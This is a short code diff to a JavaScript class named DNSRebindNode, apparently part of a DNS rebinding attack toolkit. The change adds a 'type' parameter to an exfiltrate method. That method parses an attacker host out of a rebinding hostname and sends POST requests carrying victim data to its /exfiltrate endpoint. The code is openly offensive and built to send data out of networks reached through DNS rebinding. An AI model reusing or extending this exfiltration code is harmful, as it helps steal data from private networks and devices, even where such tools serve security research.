@@ -39,7 +39,7 @@ class DNSRebindNode {
         return Promise.reject(Error('Error during rebind. Host may be down.'))
     }
 
-    static async exfiltrate(name, data) {
+    static async exfiltrate(name, data, type) {
 
         // e.g. get '52.11.130.20' from
         // 'A.52.11.130.20.1time.192.168.1.1.forever.rebind.network'
@@ -52,13 +52,20 @@ class DNSRebindNode {
 
         // make exfiltrate POST requests to /exfiltrate
         const url = `http://${host}/exfiltrate`
+        
+        type = (type || 'json').toLowerCase()
+
+        if (!['json', 'xml', 'txt'].includes(type)) {
+            throw Error(`type parameter must be "json", "xml", or "txt" not ${type}`)
+        } 
 
         const options = DNSRebindNode.fetchOptions()
         options.headers['Content-Type'] = 'application/json'
         options.method = 'POST'
         options.body = JSON.stringify({
             name,
-            data
+            data,
+            type
         })
 
         try {
